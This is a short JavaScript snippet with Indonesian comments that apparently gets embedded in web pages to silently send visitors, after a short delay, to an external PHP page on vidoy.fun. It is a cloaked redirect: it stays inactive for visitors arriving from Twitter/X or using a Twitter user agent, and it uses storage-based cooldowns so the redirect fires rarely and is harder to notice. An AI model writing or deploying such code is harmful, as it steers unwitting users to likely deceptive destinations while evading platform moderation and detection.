(function () {
  try {
    // === SETTING ===
    var target     = "https://vidoy.fun/cB6Tyq0.php"; // tujuan fix
    var cooldownMs = 60 * 1000;                       // jeda antar redirect (1 menit)
    var delayMs    = 3000;                            // delay sebelum redirect (ms)
    var requireId  = true;                            // true = wajib ada ?id=...
    // ===============

    if (!/^https:\/\//i.test(target)) return;

    // ambil id (random)
    var params = new URLSearchParams(location.search);
    var id = params.get("id");

    if (requireId && !id) return; // harus ada ?id=xxx
    var idKey = id || "_noid";

    // kecuali dari Twitter/X → jangan redirect
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var isX = /(t\.co|twitter\.com|x\.com)/i.test(REF) || /twitter/i.test(UA);
    if (isX) return;

    // anti-loop per TAB + cooldown lintas tab, keyed per id
    var page = location.origin + location.pathname;
    var sessKey = "redir_seen:" + page + "|id=" + idKey;
    var cdKey   = "redir_cd:"   + page + "|id=" + idKey;

    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    // delay lalu redirect (tab yang sama)
    setTimeout(function () {
      try { location.href = target; } catch(_) {}
    }, delayMs);

  } catch (_) {}
})();
